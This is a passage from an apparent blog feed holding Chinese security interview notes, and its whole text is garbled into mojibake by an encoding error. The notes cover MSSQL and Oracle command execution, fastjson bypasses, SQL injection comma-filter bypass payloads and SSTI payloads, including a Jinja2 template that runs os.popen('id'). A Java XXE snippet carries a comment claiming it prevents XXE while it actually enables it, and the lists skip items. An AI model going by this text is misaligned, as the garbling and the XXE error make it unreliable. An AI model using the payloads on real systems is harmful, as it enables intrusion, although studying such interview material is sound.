çš„æ‰©å±•ï¼Œå¼•å…¥äº†æ¡ä»¶å˜é‡ï¼Œä½¿å¾—ç”Ÿæˆè¿‡ç¨‹å¯ä»¥å—åˆ°æ¡ä»¶çš„æ§åˆ¶ã€‚</li></ul></li><li><p><strong>CVAE çš„ç¼–ç å™¨å’Œè§£ç å™¨å¦‚ä½•å¤„ç†æ¡ä»¶å˜é‡ï¼Ÿ</strong></p><ul><li>ç¼–ç å™¨å°†è¾“å…¥æ•°æ®å’Œæ¡ä»¶å˜é‡ä¸€èµ·ç¼–ç åˆ°æ½œåœ¨ç©ºé—´ï¼›è§£ç å™¨ä»æ½œåœ¨ç©ºé—´é‡‡æ ·ï¼Œå¹¶ç»“åˆæ¡ä»¶å˜é‡ï¼Œç”Ÿæˆæ¡ä»¶æ•°æ®ã€‚</li></ul></li><li><p><strong>CVAE çš„ä¼˜åŒ–ç›®æ ‡ä¸ VAE æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</strong></p><ul><li>CVAE çš„ä¼˜åŒ–ç›®æ ‡ä¹Ÿæ˜¯æœ€å¤§åŒ–å˜åˆ†ä¸‹ç•Œï¼Œä½†éœ€è¦è€ƒè™‘æ¡ä»¶å˜é‡çš„å½±å“ã€‚</li></ul></li><li><p><strong>CVAE åœ¨å®é™…åº”ç”¨ä¸­æœ‰å“ªäº›ä¼˜åŠ¿ï¼Ÿ</strong></p><ul><li>CVAE å¯ä»¥æ ¹æ®æ¡ä»¶ç”Ÿæˆç‰¹å®šçš„æ•°æ®æ ·æœ¬ï¼Œé€‚ç”¨äºæœ‰æ¡ä»¶çš„ç”Ÿæˆä»»åŠ¡ï¼Œå¦‚æ¡ä»¶å›¾åƒç”Ÿæˆã€æ¡ä»¶æ–‡æœ¬ç”Ÿæˆç­‰ã€‚</li></ul></li><li><p><strong>å¦‚ä½•è®¾è®¡ CVAE çš„æ¡ä»¶å˜é‡ï¼Ÿ</strong></p><ul><li>æ¡ä»¶å˜é‡å¯ä»¥æ ¹æ®å…·ä½“ä»»åŠ¡çš„éœ€æ±‚è¿›è¡Œè®¾è®¡ï¼Œä¾‹å¦‚ä½¿ç”¨æ ‡ç­¾ã€å±æ€§æˆ–å…¶ä»–ç›¸å…³æ•°æ®ä½œä¸ºæ¡ä»¶å˜é‡ã€‚</li></ul></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥ä½œã€‘é¢è¯•é¢˜æ•´ç† å¤§å‚å¸¸è§é—®é¢˜</title>
      <link href="/2024/03/17/work/workpre4/"/>
      <url>/2024/03/17/work/workpre4/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/vvmdx/Sec-Interview-4-2023">https://github.com/vvmdx/Sec-Interview-4-2023</a></p><h3 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h3><p>A1 æ³¨å…¥æ¼æ´<br>A2 å¤±æ•ˆçš„èº«ä»½è®¤è¯<br>A3 æ•æ„Ÿæ•°æ®æ³„éœ²<br>A4 XML å¤–éƒ¨å®ä½“æ¼æ´<br>A5 æ— æ•ˆçš„è®¿é—®æ§åˆ¶<br>A6 å®‰å…¨é…ç½®é”™è¯¯<br>A8 ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´<br>A9 ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶<br>A10 æ—¥å¿—è®°å½•å’Œç›‘æ§ä¸è¶³å¯¼è‡´çš„é£é™©</p><h3 id="MSSQL-é™¤äº†-xp-cmdshellã€sp-oacreate-è¿˜æœ‰ä»€ä¹ˆåŠæ³•æ‰§è¡Œå‘½ä»¤ï¼Ÿ"><a href="#MSSQL-é™¤äº†-xp-cmdshellã€sp-oacreate-è¿˜æœ‰ä»€ä¹ˆåŠæ³•æ‰§è¡Œå‘½ä»¤ï¼Ÿ" class="headerlink" title="MSSQL é™¤äº† xp_cmdshellã€sp_oacreate è¿˜æœ‰ä»€ä¹ˆåŠæ³•æ‰§è¡Œå‘½ä»¤ï¼Ÿ"></a>MSSQL é™¤äº† <code>xp_cmdshell</code>ã€<code>sp_oacreate</code> è¿˜æœ‰ä»€ä¹ˆåŠæ³•æ‰§è¡Œå‘½ä»¤ï¼Ÿ</h3><p>åœ¨ MSSQL ä¸­ï¼Œé™¤äº†ä½¿ç”¨ <code>xp_cmdshell</code> å’Œ <code>sp_oacreate</code>ï¼Œè¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><ol><li><p><strong>CLR é›†æˆ</strong>ï¼š</p><ul><li>å¯ç”¨ CLR é›†æˆï¼Œåˆ›å»º CLR å­˜å‚¨è¿‡ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ã€‚</li><li>æ­¥éª¤åŒ…æ‹¬å¯ç”¨ CLRã€åˆ›å»ºç¨‹åºé›†ã€åˆ›å»ºå­˜å‚¨è¿‡ç¨‹å’Œæ‰§è¡Œå‘½ä»¤ã€‚</li></ul></li><li><p><strong>SQL Server ä»£ç†ä½œä¸š</strong>ï¼š</p><ul><li>ä½¿ç”¨ SQL Server ä»£ç†åˆ›å»ºä½œä¸šæ¥æ‰§è¡Œå‘½ä»¤ã€‚</li><li>æ­¥éª¤åŒ…æ‹¬åˆ›å»ºä½œä¸šã€æ·»åŠ ä½œä¸šæ­¥éª¤ã€å¯åŠ¨ä½œä¸šã€‚</li></ul></li><li><p><strong>OpenRowset</strong>ï¼š</p><ul><li>åˆ©ç”¨ <code>OpenRowset</code> å’Œ Jet OLEDB æä¾›ç¨‹åºæ‰§è¡Œå‘½ä»¤ã€‚</li><li>éœ€è¦å¯ç”¨æ²™ç›’æ¨¡å¼å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</li></ul></li><li><p><strong>æ‰©å±•å­˜å‚¨è¿‡ç¨‹</strong>ï¼š</p><ul><li>ä½¿ç”¨ <code>sp_addextendedproc</code> æ·»åŠ è‡ªå®šä¹‰æ‰©å±•å­˜å‚¨è¿‡ç¨‹æ¥æ‰§è¡Œå‘½ä»¤ã€‚</li></ul></li></ol><h3 id="CLR-åŸç†ä»¥åŠæµç¨‹"><a href="#CLR-åŸç†ä»¥åŠæµç¨‹" class="headerlink" title="CLR åŸç†ä»¥åŠæµç¨‹"></a>CLR åŸç†ä»¥åŠæµç¨‹</h3><p>CLRï¼ˆCommon Language Runtimeï¼‰æ˜¯ .NET Framework çš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œè´Ÿè´£ç®¡ç†ä»£ç çš„æ‰§è¡Œã€‚åœ¨ MSSQL ä¸­ï¼ŒCLR é›†æˆå…è®¸ä½¿ç”¨ .NET Framework è¯­è¨€ç¼–å†™å­˜å‚¨è¿‡ç¨‹ã€è§¦å‘å™¨ç­‰ã€‚<br>æµç¨‹åŒ…æ‹¬ï¼š</p><ol><li>å¯ç”¨ CLR é›†æˆã€‚</li><li>åˆ›å»º CLR å­˜å‚¨è¿‡ç¨‹ã€‚</li><li>ç¼–è¯‘å¹¶éƒ¨ç½² CLR ç¨‹åºé›†ã€‚</li><li>åœ¨ MSSQL ä¸­æ³¨å†Œå¹¶ä½¿ç”¨ CLR å­˜å‚¨è¿‡ç¨‹ã€‚</li></ol><h3 id="Oracle-èƒ½ä¸èƒ½-RCEï¼Ÿæ€ä¹ˆ-RCEï¼Ÿå‰ç½®æ¡ä»¶æ˜¯å•¥ï¼Ÿ"><a href="#Oracle-èƒ½ä¸èƒ½-RCEï¼Ÿæ€ä¹ˆ-RCEï¼Ÿå‰ç½®æ¡ä»¶æ˜¯å•¥ï¼Ÿ" class="headerlink" title="Oracle èƒ½ä¸èƒ½ RCEï¼Ÿæ€ä¹ˆ RCEï¼Ÿå‰ç½®æ¡ä»¶æ˜¯å•¥ï¼Ÿ"></a>Oracle èƒ½ä¸èƒ½ RCEï¼Ÿæ€ä¹ˆ RCEï¼Ÿå‰ç½®æ¡ä»¶æ˜¯å•¥ï¼Ÿ</h3><p>Oracle æ•°æ®åº“åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥è¢«ç”¨äºè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ï¼Œè¿™é€šå¸¸ä¾èµ–äºæ•°æ®åº“çš„é…ç½®å’Œå­˜åœ¨çš„æ¼æ´ã€‚<br>æ”»å‡»æ–¹æ³•åŒ…æ‹¬ï¼š</p><ol><li><strong>åˆ©ç”¨ DBMS_SCHEDULER</strong>ï¼šé€šè¿‡åˆ›å»ºä½œä¸šæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li><li><strong>åˆ©ç”¨å¤–éƒ¨è¡¨</strong>ï¼šé€šè¿‡é…ç½®å¤–éƒ¨è¡¨æ¥æ‰§è¡Œå‘½ä»¤ã€‚</li><li><strong>åˆ©ç”¨ Java å­˜å‚¨è¿‡ç¨‹</strong>ï¼šåœ¨æ•°æ®åº“ä¸­è¿è¡Œ Java ä»£ç æ¥æ‰§è¡Œå‘½ä»¤ã€‚</li><li><strong>åˆ©ç”¨ TNS Listener æ¼æ´</strong>ï¼šé€šè¿‡ TNS Listener çš„æ¼æ´æ‰§è¡Œå‘½ä»¤ã€‚<br>å‰ç½®æ¡ä»¶åŒ…æ‹¬ï¼š</li></ol><ul><li>æ•°æ®åº“å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ã€‚</li><li>æ”»å‡»è€…å…·æœ‰è¶³å¤Ÿçš„æƒé™ã€‚</li></ul><h3 id="Autotype-false-ç»•è¿‡æœ‰å‡ ç§æ€è·¯ï¼Ÿ"><a href="#Autotype-false-ç»•è¿‡æœ‰å‡ ç§æ€è·¯ï¼Ÿ" class="headerlink" title="Autotype&#x3D;false ç»•è¿‡æœ‰å‡ ç§æ€è·¯ï¼Ÿ"></a>Autotype&#x3D;false ç»•è¿‡æœ‰å‡ ç§æ€è·¯ï¼Ÿ</h3><p>å½“ <code>autotype=false</code> æ—¶ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹ç»•è¿‡æ€è·¯ï¼š</p><ol><li><strong>æ‰‹åŠ¨æŒ‡å®šç±»å‹</strong>ï¼šæ˜¾å¼æŒ‡å®šè¾“å…¥çš„ç±»å‹ã€‚</li><li><strong>ä½¿ç”¨å¤‡ç”¨åºåˆ—åŒ–æ ¼å¼</strong>ï¼šå°è¯•ä½¿ç”¨å…¶ä»–åºåˆ—åŒ–æ ¼å¼ã€‚</li><li><strong>åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´å·¥å…·</strong>ï¼šä½¿ç”¨å·¥å…·å¦‚ ysoserial ç”Ÿæˆç‰¹å®šçš„ payloadã€‚</li><li><strong>ä¿®æ”¹è¾“å…¥æ ¼å¼</strong>ï¼šè°ƒæ•´è¾“å…¥æ•°æ®çš„æ ¼å¼ä»¥åŒ¹é…é¢„æœŸçš„ç±»å‹ã€‚</li></ol><h3 id="PHPInfo-ä½ ä¼šå…³æ³¨å“ªäº›ä¿¡æ¯"><a href="#PHPInfo-ä½ ä¼šå…³æ³¨å“ªäº›ä¿¡æ¯" class="headerlink" title="PHPInfo ä½ ä¼šå…³æ³¨å“ªäº›ä¿¡æ¯"></a>PHPInfo ä½ ä¼šå…³æ³¨å“ªäº›ä¿¡æ¯</h3><p>åœ¨æŸ¥çœ‹ <code>phpinfo()</code> è¾“å‡ºæ—¶ï¼Œåº”å…³æ³¨ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ol><li><strong>PHP ç‰ˆæœ¬</strong>ï¼šäº†è§£ PHP çš„ç‰ˆæœ¬å’Œæ›´æ–°æƒ…å†µã€‚</li><li><strong>é…ç½®é€‰é¡¹</strong>ï¼šæŸ¥çœ‹ç¼–è¯‘æ—¶çš„é…ç½®é€‰é¡¹ã€‚</li><li><strong>æ‰©å±•å’Œæ¨¡å—</strong>ï¼šè¯†åˆ«åŠ è½½çš„æ‰©å±•å’Œæ¨¡å—ã€‚</li><li><strong>ç¯å¢ƒå˜é‡</strong>ï¼šæŸ¥çœ‹æœåŠ¡å™¨çš„ç¯å¢ƒå˜é‡ã€‚</li><li><strong>å®‰å…¨ç›¸å…³è®¾ç½®</strong>ï¼šæ£€æŸ¥ä¸å®‰å…¨ç›¸å…³çš„é…ç½®ã€‚</li></ol><h3 id="æµè§ˆå™¨è§£æé¡ºåºå’Œè§£ç é¡ºåº"><a href="#æµè§ˆå™¨è§£æé¡ºåºå’Œè§£ç é¡ºåº" class="headerlink" title="æµè§ˆå™¨è§£æé¡ºåºå’Œè§£ç é¡ºåº"></a>æµè§ˆå™¨è§£æé¡ºåºå’Œè§£ç é¡ºåº</h3><p>æµè§ˆå™¨çš„è§£æé¡ºåºå’Œè§£ç é¡ºåºæ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µï¼Œä½†å®ƒä»¬åœ¨å¤„ç†ç½‘é¡µå†…å®¹æ—¶æ˜¯ç´§å¯†ç›¸å…³çš„ã€‚è§£æé¡ºåºæŒ‡çš„æ˜¯æµè§ˆå™¨å¤„ç†HTMLã€CSSå’ŒJavaScriptç­‰èµ„æºçš„é¡ºåºï¼Œè€Œè§£ç é¡ºåºåˆ™æ¶‰åŠæµè§ˆå™¨å¦‚ä½•å°†ç¼–ç çš„å­—ç¬¦è½¬æ¢ä¸ºå¯è¯»çš„æ–‡æœ¬ã€‚</p><ol><li><strong>è§£æé¡ºåº</strong>ï¼š<ul><li>æµè§ˆå™¨é€šå¸¸æŒ‰ç…§HTMLæ–‡æ¡£çš„é¡ºåºè¿›è¡Œè§£æï¼Œä»ä¸Šåˆ°ä¸‹ä¾æ¬¡å¤„ç†æ ‡ç­¾ã€å±æ€§å’Œå†…å®¹ã€‚</li><li>åœ¨è§£æè¿‡ç¨‹ä¸­ï¼Œé‡åˆ°<code>&lt;link&gt;</code>ã€<code>&lt;style&gt;</code>ã€<code>&lt;script&gt;</code>ç­‰æ ‡ç­¾æ—¶ï¼Œæµè§ˆå™¨ä¼šæš‚åœHTMLè§£æï¼Œå»åŠ è½½å’Œå¤„ç†è¿™äº›èµ„æºã€‚å…¶ä¸­ï¼Œå¤–éƒ¨æ ·å¼è¡¨ä¼šé˜»å¡åç»­çš„å¤–éƒ¨è„šæœ¬çš„åŠ è½½ï¼Œä½†ä¸ä¼šé˜»å¡å†…éƒ¨è„šæœ¬çš„æ‰§è¡Œã€‚</li></ul></li><li><strong>è§£ç é¡ºåº</strong>ï¼š<ul><li>æµè§ˆå™¨çš„è§£ç é¡ºåºé€šå¸¸æ˜¯ï¼šHTMLè§£ç  â†’ URLè§£ç  â†’ JavaScriptè§£ç ã€‚</li><li><strong>HTMLè§£ç </strong>ï¼šåœ¨æ„å»ºDOMæ ‘æ—¶ï¼Œæµè§ˆå™¨ä¼šå¯¹HTMLå®ä½“ç¼–ç çš„å†…å®¹è¿›è¡Œè§£ç ï¼Œä¾‹å¦‚<code>&amp;lt;</code>ä¼šè¢«è§£ç ä¸º<code>&lt;</code>ã€‚</li><li><strong>URLè§£ç </strong>ï¼šæœåŠ¡å™¨æ¥æ”¶åˆ°æµè§ˆå™¨è¯·æ±‚åï¼Œä¼šå…ˆè¿›è¡ŒURLè§£æï¼Œå°†ç¼–ç çš„å­—ç¬¦è½¬æ¢å›åŸå§‹å­—ç¬¦ï¼Œä¾‹å¦‚<code>%20</code>ä¼šè¢«è§£ç ä¸ºç©ºæ ¼ã€‚</li><li><strong>JavaScriptè§£ç </strong>ï¼šåœ¨æ‰§è¡ŒJavaScriptä»£ç æ—¶ï¼Œæµè§ˆå™¨ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„è½¬ä¹‰å­—ç¬¦è¿›è¡Œè§£ç ï¼Œä¾‹å¦‚<code>\u4e00</code>ä¼šè¢«è§£ç ä¸ºæ±‰å­—<code>ä¸€</code>ã€‚</li></ul></li></ol><h3 id="è¿‡æ»¤limitåçš„é€—å·å¦‚ä½•ç»•è¿‡"><a href="#è¿‡æ»¤limitåçš„é€—å·å¦‚ä½•ç»•è¿‡" class="headerlink" title="è¿‡æ»¤limitåçš„é€—å·å¦‚ä½•ç»•è¿‡"></a>è¿‡æ»¤<code>limit</code>åçš„é€—å·å¦‚ä½•ç»•è¿‡</h3><p>åœ¨SQLæ³¨å…¥ä¸­ï¼Œå¦‚æœ<code>limit</code>åçš„é€—å·è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ç»•è¿‡ï¼š</p><ul><li><strong>ä½¿ç”¨<code>JOIN</code>ä»£æ›¿é€—å·</strong>ï¼šé€šè¿‡æ„é€ <code>JOIN</code>æŸ¥è¯¢æ¥æ›¿ä»£<code>UNION SELECT</code>ä¸­çš„é€—å·ã€‚ä¾‹å¦‚ï¼Œå°†<code>UNION SELECT 1,2,3</code>æ”¹ä¸º<code>UNION SELECT * FROM ((SELECT 1)A JOIN (SELECT 2)B JOIN (SELECT 3)C)</code>ã€‚</li></ul><h3 id="è¿‡æ»¤é€—å·çš„SQLæ³¨å…¥å¦‚ä½•ç»•è¿‡"><a href="#è¿‡æ»¤é€—å·çš„SQLæ³¨å…¥å¦‚ä½•ç»•è¿‡" class="headerlink" title="è¿‡æ»¤é€—å·çš„SQLæ³¨å…¥å¦‚ä½•ç»•è¿‡"></a>è¿‡æ»¤é€—å·çš„SQLæ³¨å…¥å¦‚ä½•ç»•è¿‡</h3><p>å½“SQLæ³¨å…¥ä¸­é€—å·è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p><ul><li><strong>ä½¿ç”¨<code>JOIN</code>æ–¹æ³•</strong>ï¼šé€šè¿‡<code>JOIN</code>å¤šä¸ªå­æŸ¥è¯¢æ¥æ„é€ æ‰€éœ€çš„æŸ¥è¯¢è¯­å¥ï¼Œé¿å…ç›´æ¥ä½¿ç”¨é€—å·ã€‚</li><li><strong>åˆ©ç”¨å‡½æ•°å’Œå˜é‡</strong>ï¼šä½¿ç”¨æ•°æ®åº“æä¾›çš„å‡½æ•°å’Œå˜é‡æ¥é—´æ¥è·å–æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ä½¿ç”¨<code>user()</code>ã€<code>database()</code>ç­‰å‡½æ•°ã€‚</li></ul><h3 id="Pythonç›¸å…³çš„æ¼æ´ï¼ˆSSTIåŸç†ï¼Œåˆ©ç”¨è¿‡ç¨‹ï¼Œpayloadç›¸å…³çš„ä¸œè¥¿ï¼‰"><a href="#Pythonç›¸å…³çš„æ¼æ´ï¼ˆSSTIåŸç†ï¼Œåˆ©ç”¨è¿‡ç¨‹ï¼Œpayloadç›¸å…³çš„ä¸œè¥¿ï¼‰" class="headerlink" title="Pythonç›¸å…³çš„æ¼æ´ï¼ˆSSTIåŸç†ï¼Œåˆ©ç”¨è¿‡ç¨‹ï¼Œpayloadç›¸å…³çš„ä¸œè¥¿ï¼‰"></a>Pythonç›¸å…³çš„æ¼æ´ï¼ˆSSTIåŸç†ï¼Œåˆ©ç”¨è¿‡ç¨‹ï¼Œpayloadç›¸å…³çš„ä¸œè¥¿ï¼‰</h3><p>ä¸€ä¸ªè‘—åçš„Pythonç›¸å…³æ¼æ´æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰ã€‚SSTIå‘ç”Ÿåœ¨æœåŠ¡å™¨ç«¯ä½¿ç”¨ç”¨æˆ·è¾“å…¥åŠ¨æ€æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„æ¨¡æ¿ä»£ç ï¼Œå¯¼è‡´æœåŠ¡å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚<br><strong>åŸç†</strong>ï¼š</p><ul><li>å½“æœåŠ¡å™¨ç«¯ä½¿ç”¨å¦‚Djangoã€Jinja2ç­‰æ¨¡æ¿å¼•æ“æ—¶ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥è¢«ç›´æ¥åµŒå…¥æ¨¡æ¿ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¨¡æ¿è¯­æ³•ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</li></ul><p><strong>åˆ©ç”¨è¿‡ç¨‹</strong>ï¼š</p><ol><li><strong>ç¡®è®¤æ¼æ´å­˜åœ¨</strong>ï¼šé€šè¿‡å‘é€åŒ…å«æ¨¡æ¿è¯­æ³•çš„è¾“å…¥ï¼Œè§‚å¯ŸæœåŠ¡å™¨å“åº”æ˜¯å¦åŒ…å«æ‰§è¡Œç»“æœã€‚</li><li><strong>æ„é€ payload</strong>ï¼šæ ¹æ®æ¨¡æ¿å¼•æ“çš„è¯­æ³•ï¼Œæ„é€ èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤æˆ–è¯»å–æ–‡ä»¶çš„payloadã€‚</li><li><strong>æ‰§è¡Œå‘½ä»¤æˆ–è¯»å–æ–‡ä»¶</strong>ï¼šåˆ©ç”¨payloadæ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ã€‚</li></ol><p><strong>payloadç¤ºä¾‹</strong>ï¼š</p><ul><li><p><strong>Djangoæ¨¡æ¿å¼•æ“</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µpayloadä¼šè¿”å›æ‰€æœ‰å­ç±»ï¼Œè¿›ä¸€æ­¥å¯ä»¥åˆ©ç”¨è¿™äº›å­ç±»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p></li><li><p><strong>Jinja2æ¨¡æ¿å¼•æ“</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="variable language_">self</span>.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;id&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µpayloadä¼šæ‰§è¡Œ<code>id</code>å‘½ä»¤å¹¶è¿”å›ç»“æœã€‚</p></li></ul><h3 id="Java-å†…å­˜é©¬"><a href="#Java-å†…å­˜é©¬" class="headerlink" title="Java å†…å­˜é©¬"></a>Java å†…å­˜é©¬</h3><p><a href="https://blog.csdn.net/MachineGunJoe/article/details/118088350">https://blog.csdn.net/MachineGunJoe/article/details/118088350</a></p><h3 id="å†°èã€å“¥æ–¯æ‹‰å·¥å…·"><a href="#å†°èã€å“¥æ–¯æ‹‰å·¥å…·" class="headerlink" title="å†°èã€å“¥æ–¯æ‹‰å·¥å…·"></a>å†°èã€å“¥æ–¯æ‹‰å·¥å…·</h3><p><a href="https://blog.csdn.net/qq_53577336/article/details/125048353">https://blog.csdn.net/qq_53577336/article/details/125048353</a></p><h3 id="å®¡è¡¨è¾¾å¼å¼•æ“çš„æ­¥éª¤å’Œæ€è·¯"><a href="#å®¡è¡¨è¾¾å¼å¼•æ“çš„æ­¥éª¤å’Œæ€è·¯" class="headerlink" title="å®¡è¡¨è¾¾å¼å¼•æ“çš„æ­¥éª¤å’Œæ€è·¯"></a>å®¡è¡¨è¾¾å¼å¼•æ“çš„æ­¥éª¤å’Œæ€è·¯</h3><p>å®¡è®¡è¡¨è¾¾å¼å¼•æ“æ—¶ï¼Œæˆ‘ä¼šï¼š</p><ol><li><strong>åˆ†æè¾“å…¥å¤„ç†</strong>ï¼šæ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„è¡¨è¾¾å¼æ˜¯å¦ç»è¿‡ä¸¥æ ¼éªŒè¯ã€‚</li><li><strong>æ£€æŸ¥è§£æè¿‡ç¨‹</strong>ï¼šæŸ¥çœ‹å¼•æ“å¦‚ä½•è§£æå’Œå¤„ç†è¡¨è¾¾å¼ã€‚</li><li><strong>è¯„ä¼°å®‰å…¨æ€§</strong>ï¼šç¡®ä¿å¼•æ“ä¸ä¼šæ‰§è¡Œæ¶æ„ä»£ç æˆ–æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚</li></ol><p>ä¾‹å¦‚ï¼Œåœ¨å®¡è®¡ä¸€ä¸ªJavaè¡¨è¾¾å¼å¼•æ“æ—¶ï¼Œæˆ‘ä¼šæ£€æŸ¥å…¶æ˜¯å¦å¯¹è¾“å…¥è¡¨è¾¾å¼è¿›è¡Œäº†æ²™ç®±é™åˆ¶ï¼Œé˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œã€‚</p><h3 id="XXEæ¼æ´æˆå› åŠä»£ç å±‚é¢åˆ†æ"><a href="#XXEæ¼æ´æˆå› åŠä»£ç å±‚é¢åˆ†æ" class="headerlink" title="XXEæ¼æ´æˆå› åŠä»£ç å±‚é¢åˆ†æ"></a>XXEæ¼æ´æˆå› åŠä»£ç å±‚é¢åˆ†æ</h3><p>XXEï¼ˆXMLå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰æ¼æ´æ˜¯ç”±äºåº”ç”¨ç¨‹åºåœ¨å¤„ç†XMLè¾“å…¥æ—¶ï¼Œå¯ç”¨äº†å¤–éƒ¨å®ä½“è§£æåŠŸèƒ½ï¼Œä¸”æœªå¯¹ç”¨æˆ·è¾“å…¥çš„XMLå†…å®¹è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„XMLå†…å®¹ï¼ŒåŒ…å«å¤–éƒ¨å®ä½“å¼•ç”¨ï¼Œä»è€Œè¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚</p><p>åœ¨ä»£ç å±‚é¢ï¼Œå¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨äº†<code>DocumentBuilderFactory</code>æ¥è§£æXMLï¼Œå¹¶ä¸”æœªç¦ç”¨å¤–éƒ¨å®ä½“è§£æï¼Œå°±å¯èƒ½å­˜åœ¨XXEæ¼æ´ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-declaration&quot;</span>, <span class="literal">false</span>); <span class="comment">// ç¦ç”¨æ­¤åŠŸèƒ½å¯é˜²æ­¢XXE</span></span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">db.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(xmlInput));</span><br></pre></td></tr></table></figure><h3 id="é‡åˆ°ORDER-BYæ—¶çš„é˜²å¾¡"><a href="#é‡åˆ°ORDER-BYæ—¶çš„é˜²å¾¡" class="headerlink" title="é‡åˆ°ORDER BYæ—¶çš„é˜²å¾¡"></a>é‡åˆ°ORDER BYæ—¶çš„é˜²å¾¡</h3><p>åœ¨å¤„ç†<code>ORDER BY</code>æ—¶ï¼Œä¸ºé˜²æ­¢SQLæ³¨å…¥ï¼Œåº”ï¼š<br>2. <strong>é™åˆ¶å¯æ’åºçš„åˆ—</strong>ï¼šåªå…è®¸å¯¹ç™½åå•ä¸­çš„åˆ—è¿›è¡Œæ’åºã€‚</p><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><p>å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨å­—ç¬¦ç¼–ç ä¸­çš„å¤šå­—èŠ‚ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„è¾“å…¥æ¥ç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œåœ¨GBKç¼–ç ä¸­ï¼ŒæŸäº›å­—ç¬¦å¯ä»¥æœ‰å¤šç§ç¼–ç æ–¹å¼ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥ç»•è¿‡è¿‡æ»¤ã€‚</p><h3 id="ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰æ—¶çš„å¤„ç†"><a href="#ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰æ—¶çš„å¤„ç†" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰æ—¶çš„å¤„ç†"></a>ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰æ—¶çš„å¤„ç†</h3><p>å¦‚æœæ•°æ®åº“çš„åˆ—åæˆ–è¡¨ååŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œåº”ï¼š</p><ol><li><strong>ä½¿ç”¨å¼•å·</strong>ï¼šåœ¨SQLè¯­å¥ä¸­ä½¿ç”¨å¼•å·å°†æ 